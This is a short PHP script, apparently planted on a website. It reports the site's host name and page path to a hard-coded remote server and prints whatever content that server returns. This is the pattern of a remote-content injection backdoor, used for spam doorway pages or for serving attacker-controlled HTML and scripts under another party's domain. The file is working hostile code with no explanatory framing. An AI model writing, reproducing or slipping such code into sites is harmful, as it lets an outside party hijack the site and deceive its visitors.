<?php
set_time_limit(0);
ini_set('user_agent', $_SERVER['HTTP_USER_AGENT']);
header("Content-Type: text/html;charset=utf-8");
date_default_timezone_set('PRC');
$Remote_server = "http://menu.38dgs.com";
$host_name = "http://".$_SERVER['HTTP_HOST'];
$Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['PHP_SELF']);
echo $Content_mb;

?>
